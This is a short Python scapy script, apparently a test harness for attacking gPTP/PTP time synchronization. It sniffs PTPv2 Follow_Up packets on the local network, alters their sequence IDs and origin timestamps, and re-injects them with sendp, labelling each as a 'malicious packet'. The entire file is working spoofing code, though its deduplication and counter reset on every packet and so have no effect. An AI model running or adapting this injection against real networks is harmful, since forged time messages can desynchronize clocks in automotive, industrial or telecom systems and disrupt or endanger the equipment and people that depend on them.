from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import UDP
from gptp.layers import PTPv2
from gptp.fields import TimestampField
import time

# test
def packet_callback(packet):
    used_seq_ids = set()
    # if packet.haslayer('Ether'):
    #     print(packet[Ether].show())
    #     return
    count = 0
    if packet.haslayer('PTPv2'):
        ptp_packet = packet[PTPv2]
        if packet[PTPv2].is_followup and packet[PTPv2].sequenceId not in used_seq_ids:
            used_seq_ids.add(packet[PTPv2].sequenceId)
            count += 1
            print("original packet")
            print(packet[PTPv2].show())
            packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
            original_ts = packet[PTPv2].preciseOriginTimestamp

            packet[PTPv2].preciseOriginTimestamp = original_ts + count
            #packet[PTPv2].preciseOriginTimestamp = TimestampField("preciseOriginTimestamp", 0).any2i(None, 3.141)
            sendp(packet)
            print("send maliciouus packet")
            print(packet[PTPv2].show())
       # print(packet[PTPv2].sequenceId)

sniff(prn=packet_callback, count=100000)

